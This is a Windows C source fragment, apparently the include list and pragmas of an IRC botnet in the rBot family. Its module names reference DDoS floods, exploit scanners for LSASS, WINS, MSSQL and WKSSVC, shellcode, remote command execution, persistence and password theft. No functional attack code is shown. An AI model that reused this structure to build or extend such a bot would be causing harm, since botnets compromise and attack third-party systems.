#ifdef WIN32
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
#pragma comment(linker,"/RELEASE")			// Release code
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.
//#pragma pack(1)								// Force packing on byte boundaries.
#endif // WIN32

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
#include "defines.h"
#include "ehandler.h"
#include "loaddlls.h"
#include "tcpip.h"
#include "threads.h"
#include "Liquid.h"
#include "irc_send.h"
#include "crc32.h"
#include "netutils.h"
#include "advscan.h"
#include "ident.h"
#include "rndnick.h"
#include "download.h"
#include "scan.h"
#include "ddos.h"
#include "synflood.h"
#include "tcpflood.h"
#include "icmpflood.h"
#include "pingudp.h"
#include "redirect.h"
#include "wildcard.h"
#include "misc.h"
#include "httpd.h"
#include "crypt.h"
#include "visit.h"
#include "tftpd.h"
#include "ftpd.h"
#include "remotecmd.h"
#include "aliaslog.h"
#include "autostart.h"
#include "fphost.h"
#include "shellcode.h"
#include "lsass.h"
#include "wins.h"
#include "skysyn.h"
#include "mssql.h"
#include "lsass2.h"
#include "wkssvc.h"
#include "allx.h"
#include "kelvir.h"
#include "ntpass.h"